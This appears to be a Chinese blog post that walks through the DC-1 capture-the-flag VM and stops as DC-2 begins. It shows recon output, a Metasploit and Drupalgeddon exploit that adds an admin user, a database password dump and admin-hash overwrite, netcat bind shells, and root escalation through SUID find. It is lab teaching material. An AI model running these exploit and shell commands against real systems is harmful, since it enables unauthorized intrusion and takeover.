<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="渗透靶机总结"><meta name="keywords" content=""><meta name="author" content="George"><meta name="copyright" content="George"><title>渗透靶机总结 | A.</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Dc1"><span class="toc-number">1.</span> <span class="toc-text">Dc1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">1.3.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">1.4.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">1.5.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thefinalflag"><span class="toc-number">1.6.</span> <span class="toc-text">thefinalflag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC2"><span class="toc-number">2.</span> <span class="toc-text">DC2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集-1"><span class="toc-number">2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1-1"><span class="toc-number">2.2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2-1"><span class="toc-number">2.3.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#问题1【hydra】"><span class="toc-number">2.4.</span> <span class="toc-text">问题1【hydra】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3-1"><span class="toc-number">2.5.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4-1"><span class="toc-number">2.6.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thefinalflag-1"><span class="toc-number">2.7.</span> <span class="toc-text">thefinalflag</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">98</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">19</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="post-info"><div id="post-title">渗透靶机总结</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-08</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="Dc1"><a href="#Dc1" class="headerlink" title="Dc1"></a>Dc1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.33.136</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22&#x2F;tcp  open  ssh</span><br><span class="line">80&#x2F;tcp  open  http</span><br><span class="line">111&#x2F;tcp open  rpcbind</span><br><span class="line">MAC Address: 00:0C:29:34:9E:E8 (VMware)</span><br></pre></td></tr></table></figure>

<p>ip：192.168.33.136</p>
<p>端口：</p>
<p>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind</p>
<p>22：试着尝试ssh免密登录？？？</p>
<p>这里可以hydra爆破一波</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>80：直接访问网页</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/1-1.png" alt="1-1"></p>
<p>用dirsearch扫了一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[08:46:04] 200 -    1KB - &#x2F;COPYRIGHT.txt                                   </span><br><span class="line">[08:46:14] 200 -   17KB - &#x2F;INSTALL                           </span><br><span class="line">[08:46:15] 200 -    1KB - &#x2F;INSTALL.mysql.txt</span><br><span class="line">[08:46:15] 200 -    2KB - &#x2F;INSTALL.pgsql.txt</span><br><span class="line">[08:46:15] 200 -   17KB - &#x2F;INSTALL.txt</span><br><span class="line">[08:46:16] 200 -   18KB - &#x2F;LICENSE                         </span><br><span class="line">[08:46:16] 200 -   18KB - &#x2F;LICENSE.txt</span><br><span class="line">[08:46:16] 200 -    8KB - &#x2F;MAINTAINERS.txt                 </span><br><span class="line">[08:46:22] 200 -    5KB - &#x2F;README                    </span><br><span class="line">[08:46:23] 200 -    5KB - &#x2F;README.txt                 </span><br><span class="line">[08:46:33] 200 -    9KB - &#x2F;UPGRADE                                         </span><br><span class="line">[08:46:33] 200 -    9KB - &#x2F;UPGRADE.txt</span><br><span class="line">[08:51:42] 301 -  319B  - &#x2F;includes  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;includes&#x2F;    </span><br><span class="line">[08:51:46] 200 -    7KB - &#x2F;index.php                      </span><br><span class="line">[08:52:37] 301 -  315B  - &#x2F;misc  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;misc&#x2F;</span><br><span class="line">[08:52:41] 301 -  318B  - &#x2F;modules  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;modules&#x2F;</span><br><span class="line">[08:52:57] 200 -    7KB - &#x2F;node                                             </span><br><span class="line">[08:53:50] 301 -  319B  - &#x2F;profiles  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;profiles&#x2F;</span><br><span class="line">[08:54:06] 200 -    2KB - &#x2F;robots.txt                     </span><br><span class="line">[08:54:11] 301 -  318B  - &#x2F;scripts  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;scripts&#x2F;</span><br><span class="line">[08:54:31] 301 -  316B  - &#x2F;sites  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;sites&#x2F;</span><br><span class="line">[08:54:32] 200 -  952B  - &#x2F;sites&#x2F;all&#x2F;modules&#x2F;README.txt</span><br><span class="line">[08:54:32] 200 -    0B  - &#x2F;sites&#x2F;example.sites.php</span><br><span class="line">[08:54:32] 200 -  904B  - &#x2F;sites&#x2F;README.txt</span><br><span class="line">[08:54:32] 200 -  767B  - &#x2F;sites&#x2F;all&#x2F;themes&#x2F;README.txt</span><br><span class="line">[08:55:04] 301 -  317B  - &#x2F;themes  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;themes&#x2F;      </span><br><span class="line">[08:55:22] 200 -    7KB - &#x2F;user                                </span><br><span class="line">[08:55:22] 200 -    7KB - &#x2F;user&#x2F;                     </span><br><span class="line">[08:55:23] 200 -    7KB - &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">[08:55:37] 200 -    2KB - &#x2F;web.config                  </span><br><span class="line">[08:55:58] 200 -   42B  - &#x2F;xmlrpc.php</span><br></pre></td></tr></table></figure>

<p>robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># robots.txt</span><br><span class="line">#</span><br><span class="line"># This file is to prevent the crawling and indexing of certain parts</span><br><span class="line"># of your site by web crawlers and spiders run by sites like Yahoo!</span><br><span class="line"># and Google. By telling these &quot;robots&quot; where not to go on your site,</span><br><span class="line"># you save bandwidth and server resources.</span><br><span class="line">#</span><br><span class="line"># This file will be ignored unless it is at the root of your host:</span><br><span class="line"># Used:    http:&#x2F;&#x2F;example.com&#x2F;robots.txt</span><br><span class="line"># Ignored: http:&#x2F;&#x2F;example.com&#x2F;site&#x2F;robots.txt</span><br><span class="line">#</span><br><span class="line"># For more information about the robots.txt standard, see:</span><br><span class="line"># http:&#x2F;&#x2F;www.robotstxt.org&#x2F;wc&#x2F;robots.html</span><br><span class="line">#</span><br><span class="line"># For syntax checking, see:</span><br><span class="line"># http:&#x2F;&#x2F;www.sxw.org.uk&#x2F;computing&#x2F;robots&#x2F;check.html</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: &#x2F;includes&#x2F;</span><br><span class="line">Disallow: &#x2F;misc&#x2F;</span><br><span class="line">Disallow: &#x2F;modules&#x2F;</span><br><span class="line">Disallow: &#x2F;profiles&#x2F;</span><br><span class="line">Disallow: &#x2F;scripts&#x2F;</span><br><span class="line">Disallow: &#x2F;themes&#x2F;</span><br><span class="line"># Files</span><br><span class="line">Disallow: &#x2F;CHANGELOG.txt</span><br><span class="line">Disallow: &#x2F;cron.php</span><br><span class="line">Disallow: &#x2F;INSTALL.mysql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.pgsql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.sqlite.txt</span><br><span class="line">Disallow: &#x2F;install.php</span><br><span class="line">Disallow: &#x2F;INSTALL.txt</span><br><span class="line">Disallow: &#x2F;LICENSE.txt</span><br><span class="line">Disallow: &#x2F;MAINTAINERS.txt</span><br><span class="line">Disallow: &#x2F;update.php</span><br><span class="line">Disallow: &#x2F;UPGRADE.txt</span><br><span class="line">Disallow: &#x2F;xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: &#x2F;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;search&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;logout&#x2F;</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: &#x2F;?q&#x3D;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;search&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;logout&#x2F;</span><br></pre></td></tr></table></figure>



<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>msfconsole:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use   对应模块</span><br><span class="line">show options  查看信息</span><br><span class="line">set rhosts  远程主机ip</span><br><span class="line">run   攻击</span><br><span class="line">exploit 攻击</span><br><span class="line"></span><br><span class="line">shell 	拿到权限</span><br></pre></td></tr></table></figure>



<p>使用python反弹一个交互式shell【方便后续操作】</p>
<blockquote>
<p>方法一：</p>
<p>shell #权限，不是本地，是http链接，需要一个持久链接，反弹一个交互shell</p>
<p>python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
<p>方法二：</p>
<p>find /var/www/test -exec nc -lvp 9999 -e /bin/sh ;</p>
<p>nc 192.168.0.119 9999</p>
</blockquote>
<p>/var/www/profiles/testing:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version &#x3D; &quot;7.24&quot;</span><br><span class="line">project &#x3D; &quot;drupal&quot;</span><br><span class="line">datestamp &#x3D; &quot;1384983240&quot;</span><br></pre></td></tr></table></figure>





<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#39;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$databases &#x3D; array (</span><br><span class="line">  &#39;default&#39; &#x3D;&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#39;default&#39; &#x3D;&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#39;database&#39; &#x3D;&gt; &#39;drupaldb&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</span><br><span class="line">      &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line">      &#39;port&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">      &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">      &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>进入数据库，查看users表，发现admin的密码被加密。</p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><strong>方法一：</strong>【修改管理员密码】</p>
<p>查看官网文档+StackOverflow</p>
<p>发现mysql加密脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts&#x2F;password-hash.sh &#39;pass&#39;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh &#39;passwd&#39;</span><br><span class="line">php scripts&#x2F;password-hash.sh &#39;passwd&#39;</span><br><span class="line"></span><br><span class="line">password: passwd                hash: $S$DYUw2bI4eMoDktLEjoauViDb4yDZCQBI0bA7yoJa3oZNRHcZQgQH</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh ppap</span><br><span class="line">php scripts&#x2F;password-hash.sh ppap</span><br><span class="line"></span><br><span class="line">password: ppap          hash: $S$DCKCzF&#x2F;33eff52x&#x2F;Po.lQ5bYwDBAy8oVs&#x2F;8mZ7.GNaXFkjxyixXi</span><br></pre></td></tr></table></figure>



<p>我们虽然不能解密密码可是可以更新管理员的密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users SET pass&#x3D;&#39;$S$D5iUQJACoD2gCDtE0WaoCMmsoNPVD7Q84aXuHjuoIKwHhD9aKh9Z&#39; where name&#x3D;&#39;admin&#39;;</span><br></pre></td></tr></table></figure>





<p><strong>方法二：</strong>【添加具有管理员权限的用户】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看具体版本</span><br><span class="line">cat includes&#x2F;bootstrap.inc | grep VERSION</span><br><span class="line">define(&#39;VERSION&#39;, &#39;7.24&#39;);</span><br><span class="line">      $has_openssl &#x3D; version_compare(PHP_VERSION, &#39;5.3.4&#39;, &#39;&gt;&#x3D;&#39;) &amp;&amp; function_exists(&#39;openssl_random_pseudo_bytes&#39;);</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Drupal</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Add Admin User)                                                          | php&#x2F;webapps&#x2F;34992.py</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Admin Session)                                                           | php&#x2F;webapps&#x2F;44355.php</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (1)                                                | php&#x2F;webapps&#x2F;34984.py</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (2)                                                | php&#x2F;webapps&#x2F;34993.php</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Remote Code Execution)                                                   | php&#x2F;webapps&#x2F;35150.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀AGsite)-[&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps]</span><br><span class="line">└─# python 34992.py -t http:&#x2F;&#x2F;192.168.33.136 -u userAG -p 123456</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> flag3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</span><br></pre></td></tr></table></figure>







<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>在/etc/passwd里找到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag4:x:1001:1001:Flag4,,,:&#x2F;home&#x2F;flag4:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>打开发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ cat flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>





<h2 id="thefinalflag"><a href="#thefinalflag" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>估计是要提权了</p>
<blockquote>
<p>【SUID提权】</p>
<p>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
<p>find / -user root -perm -4000 -exec ls -ldb { }</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;procmail</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;exim4</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;pt_chown</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;sbin&#x2F;mount.nfs</span><br></pre></td></tr></table></figure>



<p>发现可以find提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find -name flag4.txt -exec &quot;whoami&quot; \;                                                           </span><br><span class="line">find -name flag4.txt -exec &quot;whoami&quot; \;</span><br><span class="line">root</span><br></pre></td></tr></table></figure>





<p><strong>法一：【直接提权】</strong></p>
<p>提权：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find -name flag4.txt -exec &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line">find -name flag4.txt -exec &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line"># whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>即可打开finalflag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#39;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>





<p><strong>法二：【提升netcat权限】</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find flag4.txt -exec netcat -lvp 2233 -e &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line">&lt;find flag4.txt -exec netcat -lvp 2233 -e &quot;&#x2F;bin&#x2F;sh&quot; \;                       </span><br><span class="line">listening on [any] 2233 ...</span><br><span class="line">192.168.33.128: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.33.136] from (UNKNOWN) [192.168.33.128] 49168</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">另外一个没有msfconsole的终端：</span><br><span class="line">netcat 192.168.33.136 2233</span><br><span class="line"></span><br><span class="line">之后正常执行就可以了</span><br></pre></td></tr></table></figure>











<h1 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-1.png" alt="2-1"></p>
